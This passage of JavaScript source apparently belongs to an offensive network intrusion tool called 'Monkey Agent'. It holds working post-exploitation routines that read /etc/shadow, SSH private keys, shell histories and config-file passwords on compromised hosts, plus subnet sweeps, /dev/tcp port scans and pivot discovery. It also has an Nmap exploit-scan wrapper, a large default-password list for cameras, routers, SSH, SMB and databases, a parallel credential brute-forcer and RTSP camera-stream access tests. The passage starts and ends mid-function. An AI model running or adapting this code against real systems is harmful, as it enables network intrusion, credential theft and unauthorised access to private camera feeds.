            ? `echo y | plink -batch -ssh ${credentials.username}@${host} -pw "${credentials.password}" "${command}"`
            : `sshpass -p "${credentials.password}" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 ${credentials.username}@${host} "${command}"`;
        exec(sshCmd, { timeout: 30000, maxBuffer: 1024 * 1024 }, (err, stdout) => {
            cb(stdout || '', !err);
        });
    }

    function smbExec(command, cb) {
        if (!credentials || !credentials.username) { cb('', false); return; }
        const smbCmd = isWin
            ? `net use \\\\${host}\\IPC$ /user:${credentials.username} "${credentials.password}" 2>&1 && ${command}`
            : `smbclient -L ${host} -U "${credentials.username}%${credentials.password}" -c "${command}" 2>&1`;
        exec(smbCmd, { timeout: 20000, maxBuffer: 512 * 1024 }, (err, stdout) => {
            cb(stdout || '', !err);
        });
    }

    const execFn = (method?.includes('SSH') || method?.includes('ssh')) ? sshExec : smbExec;

    // Phase 1: Deep System Enumeration (Sliver: sysinfo + ifconfig)
    pending++;
    if (method?.includes('SSH') || method?.includes('ssh')) {
        sshExec('uname -a; cat /etc/os-release 2>/dev/null; hostnamectl 2>/dev/null; cat /proc/cpuinfo 2>/dev/null | head -10; free -h 2>/dev/null; df -h 2>/dev/null', (out, ok) => {
            if (ok) {
                results.systemInfo.full = out.substring(0, 1500);
                results.techniques.push({ id: 'T1082', name: 'System Information Discovery', success: true });
            }
            done();
        });
    } else {
        smbExec('systeminfo 2>&1', (out, ok) => {
            if (ok) results.systemInfo.full = out.substring(0, 1500);
            done();
        });
    }

    // Phase 2: Process Enumeration (Sliver: ps)
    pending++;
    if (method?.includes('SSH') || method?.includes('ssh')) {
        sshExec('ps auxf 2>/dev/null | head -50; ss -tlnp 2>/dev/null', (out, ok) => {
            if (ok) {
                results.systemInfo.processes = out.substring(0, 2000);
                const lines = out.split('\n');
                for (const line of lines) {
                    const match = line.match(/(\S+)\s+(\d+)\s+.*\s+(\S+)$/);
                    if (match) results.processes.push({ user: match[1], pid: match[2], cmd: match[3] });
                }
                results.techniques.push({ id: 'T1057', name: 'Process Discovery', success: true });
            }
            done();
        });
    } else { done(); }

    // Phase 3: Credential Harvesting (Sliver: creds / mimikatz-style)
    pending++;
    if (method?.includes('SSH') || method?.includes('ssh')) {
        sshExec([
            'cat /etc/shadow 2>/dev/null | head -20',
            'find /home -name ".bash_history" -exec head -20 {} \\; 2>/dev/null',
            'find /home -name "id_rsa" -o -name "id_ed25519" -o -name ".pgpass" -o -name ".my.cnf" -o -name ".env" 2>/dev/null',
            'cat /etc/passwd 2>/dev/null | grep -v nologin | grep -v false',
            'find /var/www -name "*.conf" -exec grep -l "password\\|passwd\\|secret" {} \\; 2>/dev/null',
            'find /opt /etc -name "*.conf" -exec grep -li "password" {} \\; 2>/dev/null | head -10'
        ].join('; '), (out, ok) => {
            if (ok) {
                results.credentialsFound.push({ type: 'files', data: out.substring(0, 2000) });
                results.techniques.push({ id: 'T1003', name: 'OS Credential Dumping', success: true });
                results.techniques.push({ id: 'T1552', name: 'Unsecured Credentials', success: true });
            }
            done();
        });
    } else {
        smbExec('dir \\\\' + host + '\\C$\\Users 2>&1', (out, ok) => {
            if (ok) results.credentialsFound.push({ type: 'users', data: out.substring(0, 1000) });
            done();
        });
    }

    // Phase 4: Network Mapping & Pivot Discovery (Sliver: pivots)
    pending++;
    if (method?.includes('SSH') || method?.includes('ssh')) {
        sshExec([
            'ip addr show 2>/dev/null || ifconfig 2>/dev/null',
            'ip route show 2>/dev/null || route -n 2>/dev/null',
            'cat /etc/resolv.conf 2>/dev/null',
            'arp -an 2>/dev/null || ip neigh show 2>/dev/null',
            'cat /proc/net/arp 2>/dev/null',
            'ss -tlnp 2>/dev/null | grep LISTEN'
        ].join('; '), (out, ok) => {
            if (ok) {
                results.networkMap.push({ type: 'full-network', data: out.substring(0, 3000) });
                // Extract IPs for pivot targets
                const ips = out.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/g) || [];
                const uniqueIps = [...new Set(ips)].filter(ip =>
                    ip !== host && !ip.startsWith('127.') && !ip.startsWith('0.') && ip !== '255.255.255.255'
                );
                results.pivotPoints = uniqueIps.slice(0, 30);
                results.techniques.push({ id: 'T1016', name: 'System Network Configuration Discovery', success: true });
                results.techniques.push({ id: 'T1049', name: 'System Network Connections Discovery', success: true });
            }
            done();
        });
    } else { done(); }

    // Phase 5: Lateral Movement Target Discovery (Sliver: scan / portscan)
    pending++;
    if (method?.includes('SSH') || method?.includes('ssh')) {
        sshExec([
            'for i in $(seq 1 254); do (ping -c1 -W1 $(ip route 2>/dev/null | grep default | awk "{print \\$3}" | cut -d. -f1-3).$i &>/dev/null && echo "ALIVE:$(ip route 2>/dev/null | grep default | awk "{print \\$3}" | cut -d. -f1-3).$i" &); done; wait 2>/dev/null',
            'nmap -sn $(ip route 2>/dev/null | grep default | awk "{print \\$3}" | cut -d. -f1-3).0/24 2>/dev/null | grep "Nmap scan" || true'
        ].join('; '), (out, ok) => {
            if (ok) {
                const aliveHosts = (out.match(/ALIVE:(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/g) || [])
                    .map(h => h.replace('ALIVE:', ''));
                const nmapHosts = (out.match(/Nmap scan report for (\S+)/g) || [])
                    .map(h => h.replace('Nmap scan report for ', ''));
                results.lateralTargets = [...new Set([...aliveHosts, ...nmapHosts])].filter(ip => ip !== host);
                results.techniques.push({ id: 'T1018', name: 'Remote System Discovery', success: true });
            }
            done();
        });
    } else { done(); }

    // Phase 6: Service Enumeration on Discovered Targets (quick port scan from inside)
    pending++;
    if (method?.includes('SSH') || method?.includes('ssh')) {
        sshExec([
            'for target in $(arp -an 2>/dev/null | grep -oP "\\d+\\.\\d+\\.\\d+\\.\\d+" | head -5); do',
            '  for port in 22 80 443 445 3389 8080 554 3306 5432; do',
            '    (echo >/dev/tcp/$target/$port 2>/dev/null && echo "OPEN:$target:$port") &',
            '  done',
            'done',
            'wait 2>/dev/null'
        ].join(' '), (out, ok) => {
            if (ok) {
                const openPorts = (out.match(/OPEN:(\S+):(\d+)/g) || []).map(m => {
                    const parts = m.replace('OPEN:', '').split(':');
                    return { host: parts[0], port: parseInt(parts[1]) };
                });
                results.systemInfo.neighborPorts = openPorts;
                results.techniques.push({ id: 'T1046', name: 'Network Service Discovery', success: openPorts.length > 0 });
            }
            done();
        });
    } else { done(); }

    // Phase 7: Persistence Check (Sliver: persistence mechanisms)
    pending++;
    if (method?.includes('SSH') || method?.includes('ssh')) {
        sshExec([
            'crontab -l 2>/dev/null',
            'ls -la /etc/cron.d/ 2>/dev/null',
            'cat /etc/rc.local 2>/dev/null',
            'systemctl list-unit-files --state=enabled 2>/dev/null | head -20',
            'ls -la ~/.ssh/authorized_keys 2>/dev/null',
            'cat ~/.ssh/authorized_keys 2>/dev/null | wc -l'
        ].join('; '), (out, ok) => {
            if (ok) {
                results.persistence.push({ type: 'cron-and-services', data: out.substring(0, 1500) });
                results.techniques.push({ id: 'T1053', name: 'Scheduled Task/Job', success: true });
            }
            done();
        });
    } else { done(); }
}

// ===== ENHANCED VULNERABILITY SCANNER =====
// Improved detection with Nmap NSE scripts integration + built-in checks

function enhancedVulnScan(host, openPorts, callback) {
    const results = { vulns: [], services: [], cves: [] };
    let pending = 0;

    function done() {
        pending--;
        if (pending <= 0) callback(results);
    }

    // Check for Nmap NSE scanning
    pending++;
    const portList = openPorts.join(',');
    exec(`nmap --script=vuln,exploit,auth -p ${portList} ${host} -oN - 2>/dev/null`, { timeout: 120000, maxBuffer: 5 * 1024 * 1024 }, (err, stdout) => {
        if (stdout) {
            results.services.push({ type: 'nmap-vuln-scan', data: stdout.substring(0, 5000) });
            // Parse CVEs
            const cves = stdout.match(/CVE-\d{4}-\d+/g) || [];
            results.cves = [...new Set(cves)];
            // Parse vulns
            const vulnMatches = stdout.match(/VULNERABLE:.*|STATE:.*VULNERABLE/gi) || [];
            for (const v of vulnMatches) {
                results.vulns.push({ description: v.trim(), source: 'nmap-nse' });
            }
        }
        done();
    });

    // Check common vulnerabilities via banner grabbing
    for (const port of openPorts.slice(0, 10)) {
        pending++;
        const socket = new net.Socket();
        socket.setTimeout(5000);
        let banner = '';
        socket.on('data', (data) => { banner += data.toString(); });
        socket.on('connect', () => {
            if (port === 80 || port === 8080 || port === 443) {
                socket.write(`GET / HTTP/1.1\r\nHost: ${host}\r\nUser-Agent: Mozilla/5.0\r\n\r\n`);
            }
            setTimeout(() => {
                socket.destroy();
                if (banner) {
                    results.services.push({ port, banner: banner.substring(0, 500) });
                    // Check for known vulnerable versions
                    const lower = banner.toLowerCase();
                    if (lower.includes('apache/2.4.49') || lower.includes('apache/2.4.50'))
                        results.vulns.push({ port, vuln: 'CVE-2021-41773 - Apache Path Traversal', severity: 'critical' });
                    if (lower.includes('openssh_7.') || lower.includes('openssh_6.'))
                        results.vulns.push({ port, vuln: 'Outdated OpenSSH - Multiple CVEs', severity: 'high' });
                    if (lower.includes('vsftpd 2.3.4'))
                        results.vulns.push({ port, vuln: 'CVE-2011-2523 - vsftpd Backdoor', severity: 'critical' });
                    if (lower.includes('proftpd 1.3.3') || lower.includes('proftpd 1.3.5'))
                        results.vulns.push({ port, vuln: 'ProFTPD RCE Vulnerability', severity: 'critical' });
                    if (lower.includes('microsoft-iis/6') || lower.includes('microsoft-iis/7'))
                        results.vulns.push({ port, vuln: 'Outdated IIS - Multiple CVEs', severity: 'high' });
                    if (lower.includes('php/5.') || lower.includes('php/7.0') || lower.includes('php/7.1'))
                        results.vulns.push({ port, vuln: 'Outdated PHP Version - Multiple CVEs', severity: 'high' });
                    if (lower.includes('wordpress'))
                        results.vulns.push({ port, vuln: 'WordPress Detected - Check plugins for vulnerabilities', severity: 'medium' });
                    if (lower.includes('tomcat/7') || lower.includes('tomcat/8.0'))
                        results.vulns.push({ port, vuln: 'Outdated Apache Tomcat', severity: 'high' });
                }
                done();
            }, 3000);
        });
        socket.on('timeout', () => { socket.destroy(); done(); });
        socket.on('error', () => { done(); });
        socket.connect(port, host);
    }

    // Check for anonymous FTP
    if (openPorts.includes(21)) {
        pending++;
        const ftpSocket = new net.Socket();
        ftpSocket.setTimeout(5000);
        let ftpResponse = '';
        ftpSocket.on('data', (d) => { ftpResponse += d.toString(); });
        ftpSocket.on('connect', () => {
            setTimeout(() => {
                ftpSocket.write('USER anonymous\r\n');
                setTimeout(() => {
                    ftpSocket.write('PASS anonymous@\r\n');
                    setTimeout(() => {
                        ftpSocket.destroy();
                        if (ftpResponse.includes('230')) {
                            results.vulns.push({ port: 21, vuln: 'Anonymous FTP Access Allowed', severity: 'high' });
                        }
                        done();
                    }, 2000);
                }, 1000);
            }, 1000);
        });
        ftpSocket.on('timeout', () => { ftpSocket.destroy(); done(); });
        ftpSocket.on('error', () => { done(); });
        ftpSocket.connect(21, host);
    }

    // Check for open Redis (no auth)
    if (openPorts.includes(6379)) {
        pending++;
        const redisSocket = new net.Socket();
        redisSocket.setTimeout(5000);
        let redisResp = '';
        redisSocket.on('data', (d) => { redisResp += d.toString(); });
        redisSocket.on('connect', () => {
            redisSocket.write('INFO\r\n');
            setTimeout(() => {
                redisSocket.destroy();
                if (redisResp.includes('redis_version')) {
                    results.vulns.push({ port: 6379, vuln: 'Redis No Authentication - Full Access', severity: 'critical' });
                }
                done();
            }, 2000);
        });
        redisSocket.on('timeout', () => { redisSocket.destroy(); done(); });
        redisSocket.on('error', () => { done(); });
        redisSocket.connect(6379, host);
    }

    // Check for open MongoDB (no auth)
    if (openPorts.includes(27017)) {
        pending++;
        const mongoSocket = new net.Socket();
        mongoSocket.setTimeout(5000);
        mongoSocket.on('connect', () => {
            mongoSocket.destroy();
            results.vulns.push({ port: 27017, vuln: 'MongoDB Port Open - Check Authentication', severity: 'high' });
            done();
        });
        mongoSocket.on('timeout', () => { mongoSocket.destroy(); done(); });
        mongoSocket.on('error', () => { done(); });
        mongoSocket.connect(27017, host);
    }

    if (pending === 0) callback(results);
}

// ===== COMPREHENSIVE CREDENTIAL DATABASE =====
const CREDENTIAL_DB = {
    cameras: [
        { username: 'admin', password: 'admin' },
        { username: 'admin', password: '12345' },
        { username: 'admin', password: '123456' },
        { username: 'admin', password: '' },
        { username: 'admin', password: 'password' },
        { username: 'admin', password: '888888' },
        { username: 'admin', password: '666666' },
        { username: 'admin', password: '1111' },
        { username: 'admin', password: '1234' },
        { username: 'admin', password: '4321' },
        { username: 'admin', password: '54321' },
        { username: 'admin', password: 'pass' },
        { username: 'admin', password: 'admin123' },
        { username: 'admin', password: 'Admin123' },
        { username: 'admin', password: 'camera' },
        { username: 'admin', password: 'Camera123' },
        { username: 'root', password: 'root' },
        { username: 'root', password: 'admin' },
        { username: 'root', password: 'pass' },
        { username: 'root', password: '123456' },
        { username: 'root', password: 'vizxv' },
        { username: 'root', password: 'xc3511' },
        { username: 'root', password: 'ikwb' },
        { username: 'root', password: 'dreambox' },
        { username: 'root', password: 'xmhdipc' },
        { username: 'root', password: 'juantech' },
        { username: 'root', password: 'realtek' },
        { username: 'root', password: '7ujMko0admin' },
        { username: 'root', password: 'zlxx.' },
        { username: 'root', password: 'Zte521' },
        { username: 'root', password: 'hi3518' },
        { username: 'root', password: 'anko' },
        { username: 'root', password: 'jvbzd' },
        { username: 'root', password: 'system' },
        { username: 'service', password: 'service' },
        { username: 'supervisor', password: 'supervisor' },
        { username: 'guest', password: 'guest' },
        { username: 'user', password: 'user' },
        { username: 'default', password: 'default' },
        { username: 'user1', password: '1user1' }
    ],
    hikvision: [
        { username: 'admin', password: '12345' },
        { username: 'admin', password: 'admin12345' },
        { username: 'admin', password: 'hiklinux' },
        { username: 'admin', password: 'Hik12345' },
        { username: 'admin', password: 'a]]' },
        { username: 'admin', password: '2345678' },
        { username: 'admin', password: '12345678' }
    ],
    dahua: [
        { username: 'admin', password: 'admin' },
        { username: 'admin', password: '123456' },
        { username: 'admin', password: 'dahua' },
        { username: 'admin', password: 'Dahua123' },
        { username: 'admin', password: 'DahuaTech' },
        { username: 'root', password: 'root' },
        { username: '888888', password: '888888' },
        { username: '666666', password: '666666' }
    ],
    axis: [
        { username: 'root', password: 'pass' },
        { username: 'root', password: 'root' },
        { username: 'admin', password: 'admin' }
    ],
    samsung: [
        { username: 'admin', password: '4321' },
        { username: 'admin', password: 'admin' },
        { username: 'root', password: '4321' }
    ],
    routers: [
        { username: 'admin', password: 'admin' },
        { username: 'admin', password: 'password' },
        { username: 'admin', password: '' },
        { username: 'admin', password: '1234' },
        { username: 'admin', password: '12345' },
        { username: 'admin', password: '123456' },
        { username: 'root', password: 'root' },
        { username: 'root', password: 'admin' },
        { username: 'admin', password: 'motorola' },
        { username: 'admin', password: 'changeme' },
        { username: 'user', password: 'user' },
        { username: 'cusadmin', password: 'highspeed' },
        { username: 'admin', password: 'sky' },
        { username: 'admin', password: 'cisco' },
        { username: 'cisco', password: 'cisco' },
        { username: 'admin', password: 'mikrotik' },
        { username: 'admin', password: 'ubnt' }
    ],
    ssh: [
        { username: 'root', password: 'root' },
        { username: 'root', password: 'toor' },
        { username: 'root', password: 'admin' },
        { username: 'root', password: 'password' },
        { username: 'root', password: '123456' },
        { username: 'root', password: '12345678' },
        { username: 'admin', password: 'admin' },
        { username: 'admin', password: 'password' },
        { username: 'admin', password: '123456' },
        { username: 'user', password: 'user' },
        { username: 'user', password: 'password' },
        { username: 'test', password: 'test' },
        { username: 'guest', password: 'guest' },
        { username: 'ubuntu', password: 'ubuntu' },
        { username: 'pi', password: 'raspberry' },
        { username: 'oracle', password: 'oracle' },
        { username: 'postgres', password: 'postgres' },
        { username: 'mysql', password: 'mysql' },
        { username: 'ftpuser', password: 'ftpuser' },
        { username: 'nagios', password: 'nagios' }
    ],
    smb: [
        { username: 'administrator', password: 'administrator' },
        { username: 'administrator', password: 'password' },
        { username: 'administrator', password: '123456' },
        { username: 'administrator', password: 'admin' },
        { username: 'admin', password: 'admin' },
        { username: 'admin', password: 'password' },
        { username: 'guest', password: '' },
        { username: 'guest', password: 'guest' }
    ],
    database: [
        { username: 'root', password: '' },
        { username: 'root', password: 'root' },
        { username: 'root', password: 'mysql' },
        { username: 'root', password: 'password' },
        { username: 'root', password: '123456' },
        { username: 'sa', password: '' },
        { username: 'sa', password: 'sa' },
        { username: 'sa', password: 'password' },
        { username: 'postgres', password: 'postgres' },
        { username: 'postgres', password: 'password' },
        { username: 'mongo', password: 'mongo' },
        { username: 'admin', password: 'admin' }
    ]
};

// Camera architectures and brands database
const CAMERA_ARCHITECTURES = {
    hikvision: {
        name: 'Hikvision',
        rtspPaths: ['/Streaming/Channels/101', '/Streaming/Channels/1', '/h264/ch1/main/av_stream', '/live'],
        httpPaths: ['/ISAPI/System/deviceInfo', '/doc/page/login.asp', '/System/configurationFile?auth=YWRtaW46MTEK'],
        defaultPorts: [80, 443, 554, 8000, 8200],
        signatures: ['hikvision', 'HIKVISION', 'Hik-Connect', 'DVRDVS-Webs']
    },
    dahua: {
        name: 'Dahua',
        rtspPaths: ['/cam/realmonitor?channel=1&subtype=0', '/live', '/cam1/mpeg4'],
        httpPaths: ['/RPC2_Login', '/cgi-bin/magicBox.cgi?action=getSystemInfo'],
        defaultPorts: [80, 443, 554, 37777],
        signatures: ['dahua', 'DahuaTech', 'DHCP', 'Amcrest']
    },
    axis: {
        name: 'Axis',
        rtspPaths: ['/axis-media/media.amp', '/mpeg4/media.amp', '/mjpg/video.mjpg'],
        httpPaths: ['/axis-cgi/param.cgi', '/axis-cgi/mjpg/video.cgi'],
        defaultPorts: [80, 443, 554],
        signatures: ['AXIS', 'axis', 'Axis Communications']
    },
    samsung: {
        name: 'Samsung/Hanwha',
        rtspPaths: ['/profile1/media.smp', '/onvif/profile2/media.smp'],
        httpPaths: ['/home/monitoring.cgi'],
        defaultPorts: [80, 443, 554, 4520],
        signatures: ['samsung', 'SAMSUNG', 'Hanwha', 'wisenet']
    },
    generic_onvif: {
        name: 'Generic ONVIF',
        rtspPaths: ['/stream1', '/stream0', '/video1', '/media/video1', '/onvif1', '/h264'],
        httpPaths: ['/onvif/device_service'],
        defaultPorts: [80, 554, 8080],
        signatures: ['onvif', 'ONVIF']
    },
    reolink: {
        name: 'Reolink',
        rtspPaths: ['/h264Preview_01_main', '/h264Preview_01_sub'],
        httpPaths: ['/cgi-bin/api.cgi?cmd=Login'],
        defaultPorts: [80, 443, 554, 9000],
        signatures: ['reolink', 'Reolink']
    },
    uniview: {
        name: 'Uniview',
        rtspPaths: ['/media/video1', '/unicast/c1/s0/live'],
        httpPaths: ['/cgi-bin/main-cgi?json'],
        defaultPorts: [80, 443, 554],
        signatures: ['uniview', 'Uniview', 'UNV']
    },
    tplink: {
        name: 'TP-Link',
        rtspPaths: ['/stream1', '/stream2'],
        httpPaths: ['/'],
        defaultPorts: [80, 443, 554, 2020],
        signatures: ['tp-link', 'TP-LINK', 'tplink']
    }
};

// Parallel credential testing engine - tests N credentials concurrently
function parallelTestCredentials(host, port, service, credentials, concurrency, callback) {
    const results = [];
    let index = 0;
    let active = 0;
    let found = false;
    let completed = 0;
    const total = credentials.length;

    function launchNext() {
        while (active < concurrency && index < credentials.length && !found) {
            active++;
            const cred = credentials[index++];
            testCredentials(host, port, service, cred.username, cred.password, (r) => {
                r.password = cred.password;
                results.push(r);
                completed++;
                if (r.success) found = true;
                active--;
                if (found || completed >= total) {
                    if (active === 0) finish();
                } else {
                    launchNext();
                }
            });
        }
        if (active === 0 && (found || index >= credentials.length)) {
            finish();
        }
    }

    function finish() {
        const best = results.find(r => r.success);
        callback({
            success: !!best,
            method: best ? best.method : `${service}-brute`,
            host, port, service,
            username: best ? best.username : null,
            password: best ? best.password : null,
            allResults: results,
            attempts: results.length,
            total: credentials.length,
            info: best ? `Login successful: ${best.username}:${best.password}` : `All ${results.length} attempts failed`
        });
    }

    launchNext();
}

// Identify camera brand from HTTP banner
function identifyCameraBrand(host, port, callback) {
    const socket = new net.Socket();
    socket.setTimeout(5000);
    let response = '';

    socket.on('data', (data) => { response += data.toString(); });
    socket.on('connect', () => {
        socket.write(`GET / HTTP/1.1\r\nHost: ${host}\r\nUser-Agent: Mozilla/5.0\r\n\r\n`);
        setTimeout(() => {
            socket.destroy();
            const lower = response.toLowerCase();
            for (const [brand, info] of Object.entries(CAMERA_ARCHITECTURES)) {
                for (const sig of info.signatures) {
                    if (lower.includes(sig.toLowerCase())) {
                        callback({ brand, name: info.name, response: response.substring(0, 300) });
                        return;
                    }
                }
            }
            callback({ brand: 'unknown', name: 'Unknown Camera', response: response.substring(0, 300) });
        }, 3000);
    });
    socket.on('timeout', () => { socket.destroy(); callback({ brand: 'unknown', name: 'Unknown' }); });
    socket.on('error', () => { callback({ brand: 'unknown', name: 'Unknown' }); });
    socket.connect(port, host);
}

// Test RTSP stream access
function testRTSPAccess(host, port, path, username, password, callback) {
    const socket = new net.Socket();
    socket.setTimeout(5000);
    let response = '';
    const authStr = username && password ? `${username}:${password}@` : '';
    const url = `rtsp://${authStr}${host}:${port}${path}`;

    socket.on('data', (data) => { response += data.toString(); });
    socket.on('connect', () => {
        socket.write(`DESCRIBE ${url} RTSP/1.0\r\nCSeq: 1\r\nUser-Agent: MonkeyAgent\r\nAccept: application/sdp\r\n\r\n`);
        setTimeout(() => {
            socket.destroy();
            const success = response.includes('200 OK') || response.includes('application/sdp');
            const unauthorized = response.includes('401');
            callback({ success, unauthorized, url: `rtsp://${host}:${port}${path}`, response: response.substring(0, 200) });
        }, 3000);
    });
    socket.on('timeout', () => { socket.destroy(); callback({ success: false, url }); });
    socket.on('error', () => { callback({ success: false, url }); });
    socket.connect(port || 554, host);
}

// Full camera scan: identify brand, test credentials, try RTSP paths
function scanCamera(host, openPorts, callback) {
    const results = { host, brand: 'unknown', brandName: 'Unknown', rtspStreams: [], credentials: [], vulnerabilities: [] };
    const httpPort = openPorts.find(p => [80, 8080, 443].includes(p)) || 80;
    const rtspPort = openPorts.find(p => [554, 8554].includes(p)) || 554;

    identifyCameraBrand(host, httpPort, (brandInfo) => {
        results.brand = brandInfo.brand;
        results.brandName = brandInfo.name;

        const arch = CAMERA_ARCHITECTURES[brandInfo.brand] || CAMERA_ARCHITECTURES.generic_onvif;
        const creds = [
            ...(CREDENTIAL_DB[brandInfo.brand] || []),
            ...CREDENTIAL_DB.cameras
        ];
        const uniqueCreds = [];
        const seen = new Set();
        for (const c of creds) {
            const key = `${c.username}:${c.password}`;
            if (!seen.has(key)) { seen.add(key); uniqueCreds.push(c); }
        }

        // Test HTTP credentials
        parallelTestCredentials(host, httpPort, 'http', uniqueCreds.slice(0, 30), 5, (credResult) => {
            results.credentials = credResult;

            // Test RTSP paths
            let rtspDone = 0;
            const rtspPaths = arch.rtspPaths || [];
            if (rtspPaths.length === 0) { callback(results); return; }

            for (const rtspPath of rtspPaths) {
                const username = credResult.success ? credResult.username : 'admin';
                const password = credResult.success ? credResult.password : 'admin';
                testRTSPAccess(host, rtspPort, rtspPath, username, password, (rtspResult) => {
                    if (rtspResult.success) {
                        results.rtspStreams.push(rtspResult.url);
                    }
                    rtspDone++;
                    if (rtspDone >= rtspPaths.length) {
                        callback(results);
                    }
                });
            }
        });
    });
}

// Get credentials for a device type
function getCredentialsForDevice(deviceType, brand) {
    const brandCreds = brand && CREDENTIAL_DB[brand] ? CREDENTIAL_DB[brand] : [];
    let typeCreds = [];
    if (deviceType === 'Camera') typeCreds = CREDENTIAL_DB.cameras;
    else if (deviceType === 'Router') typeCreds = CREDENTIAL_DB.routers;
    else if (deviceType === 'Linux Server' || deviceType === 'Web Server') typeCreds = CREDENTIAL_DB.ssh;
    else if (deviceType === 'Windows PC') typeCreds = CREDENTIAL_DB.smb;
    else if (deviceType === 'Database Server') typeCreds = CREDENTIAL_DB.database;
    else typeCreds = CREDENTIAL_DB.ssh;

    const all = [...brandCreds, ...typeCreds];
    const uniqueCreds = [];
    const seen = new Set();
    for (const c of all) {
        const key = `${c.username}:${c.password}`;
        if (!seen.has(key)) { seen.add(key); uniqueCreds.push(c); }
    }
    return uniqueCreds;
}

// Device type identification based on open ports and OS
function identifyDeviceType(openPorts, osInfo) {
    const os = (osInfo || '').toLowerCase();
    const ports = openPorts || [];
    if (ports.includes(554) || ports.includes(8554) || os.includes('camera') || os.includes('hikvision') || os.includes('dahua')) return 'Camera';
    if (ports.includes(80) && ports.includes(53) && !ports.includes(22)) return 'Router';
    if (ports.includes(80) && (ports.includes(443) || ports.includes(8080)) && ports.length <= 3) return 'IoT Device';
    if (ports.includes(9100) || ports.includes(515) || ports.includes(631)) return 'Printer';
    if (ports.includes(3389) || os.includes('windows')) return 'Windows PC';
    if (ports.includes(22) && (os.includes('linux') || os.includes('ubuntu') || os.includes('debian'))) return 'Linux Server';
    if (ports.includes(80) || ports.includes(443) || ports.includes(8080)) return 'Web Server';
    if (ports.includes(3306) || ports.includes(5432) || ports.includes(1433) || ports.includes(27017)) return 'Database Server';
    if (ports.includes(25) || ports.includes(110) || ports.includes(143)) return 'Mail Server';
    if (ports.length === 0) return 'Unknown';
    return 'Network Device';
}

// Map port number to service name
function getServiceName(port) {
    const serviceMap = {
        21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS',
        80: 'HTTP', 110: 'POP3', 135: 'MSRPC', 139: 'NetBIOS', 143: 'IMAP',
        443: 'HTTPS', 445: 'SMB', 554: 'RTSP', 993: 'IMAPS', 995: 'POP3S',
        1433: 'MSSQL', 1521: 'Oracle', 3306: 'MySQL', 3389: 'RDP',
        5432: 'PostgreSQL', 5900: 'VNC', 6379: 'Redis', 8080: 'HTTP-Proxy',
        8443: 'HTTPS-Alt', 8554: 'RTSP-Alt', 8888: 'HTTP-Alt', 27017: 'MongoDB'
    };
    return serviceMap[port] || `Port-${port}`;
}

// ===== SMART POST-EXPLOITATION AGENT (Monkey Agent) =====
// After successful exploitation, this agent gathers intelligence and discovers new targets

function postExploitAgent(host, method, credentials, callback) {
    const results = {
        host, phase: 'post-exploitation',
        systemInfo: {}, networkInfo: {}, discoveredHosts: [],
        credentials: [], services: [], files: []
    };
    const isWin = process.platform === 'win32';
    let pending = 0;

    function done() {
        pending--;
        if (pending <= 0) callback(results);
    }

    function sshExec(cmd, cb) {
        if (!credentials || !credentials.username) { cb('', false); return; }
        const escapedPass = (credentials.password || '').replace(/'/g, "\\'");
        if (isWin) {
            exec(`echo y | plink -ssh ${credentials.username}@${host} -pw "${credentials.password}" "${cmd}" 2>&1`, { timeout: 15000 }, (err, stdout) => {
                cb(stdout || '', !err && stdout && !stdout.includes('denied'));
            });
        } else {
            exec(`sshpass -p '${escapedPass}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 ${credentials.username}@${host} "${cmd}" 2>&1`, { timeout: 15000 }, (err, stdout) => {
                cb(stdout || '', !err && stdout && !stdout.includes('denied'));
            });
        }
    }

    function smbExec(cmd, cb) {
        if (!credentials || !credentials.username) { cb('', false); return; }
        const escapedPass = (credentials.password || '').replace(/'/g, "\\'");
        if (isWin) {
            exec(`net use \\\\${host}\\IPC$ /user:${credentials.username} "${credentials.password}" 2>&1 && ${cmd} 2>&1`, { timeout: 15000 }, (err, stdout) => {
                cb(stdout || '', !err);
            });
        } else {
            exec(`rpcclient -U '${credentials.username}%${escapedPass}' ${host} -c "${cmd}" 2>&1`, { timeout: 15000 }, (err, stdout) => {
                cb(stdout || '', !err && !stdout.includes('NT_STATUS'));
            });
        }
    }

    // 1. System Info Gathering
    pending++;
    if (method === 'SSH' || method?.startsWith('NetExec-SSH') || method?.includes('ssh')) {
        sshExec('uname -a 2>/dev/null; hostname 2>/dev/null; cat /etc/os-release 2>/dev/null | head -5; uptime 2>/dev/null', (out, ok) => {
            if (ok) results.systemInfo.os = out.substring(0, 400);
            done();
        });
    } else if (method?.includes('SMB') || method?.includes('Impacket')) {
        smbExec('srvinfo', (out, ok) => {
            if (ok) results.systemInfo.os = out.substring(0, 400);
            done();
        });
    } else { done(); }

    // 2. Network Discovery - find neighboring hosts
    pending++;
    if (method === 'SSH' || method?.startsWith('NetExec-SSH') || method?.includes('ssh')) {
        sshExec('arp -a 2>/dev/null; ip neigh 2>/dev/null; cat /proc/net/arp 2>/dev/null', (out, ok) => {
            if (ok && out) {
                const ips = out.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/g) || [];
                results.discoveredHosts = [...new Set(ips)].filter(ip => ip !== host && ip !== '0.0.0.0' && ip !== '255.255.255.255');
            }
            done();
        });
    } else { done(); }

    // 3. Active Users & Logged-in Sessions
    pending++;
    if (method === 'SSH' || method?.startsWith('NetExec-SSH') || method?.includes('ssh')) {
        sshExec('w 2>/dev/null; last -5 2>/dev/null; cat /etc/passwd 2>/dev/null | grep -v nologin | grep -v false | cut -d: -f1', (out, ok) => {
            if (ok) results.systemInfo.users = out.substring(0, 500);
            done();
        });
    } else if (method?.includes('SMB') || method?.includes('Impacket')) {
        smbExec('enumdomusers', (out, ok) => {
            if (ok) results.systemInfo.users = out.substring(0, 500);
            done();
        });
    } else { done(); }

    // 4. Network Configuration & Interfaces
    pending++;
    if (method === 'SSH' || method?.startsWith('NetExec-SSH') || method?.includes('ssh')) {
        sshExec('ip addr 2>/dev/null || ifconfig 2>/dev/null; ip route 2>/dev/null || route -n 2>/dev/null; cat /etc/resolv.conf 2>/dev/null', (out, ok) => {
            if (ok) {
                results.networkInfo.interfaces = out.substring(0, 600);
                const subnets = out.match(/(\d{1,3}\.\d{1,3}\.\d{1,3})\.\d{1,3}\/\d+/g) || [];
                results.networkInfo.subnets = [...new Set(subnets)];
            }
            done();
        });
    } else { done(); }

    // 5. Running Services & Open Ports (from inside)
    pending++;
    if (method === 'SSH' || method?.startsWith('NetExec-SSH') || method?.includes('ssh')) {
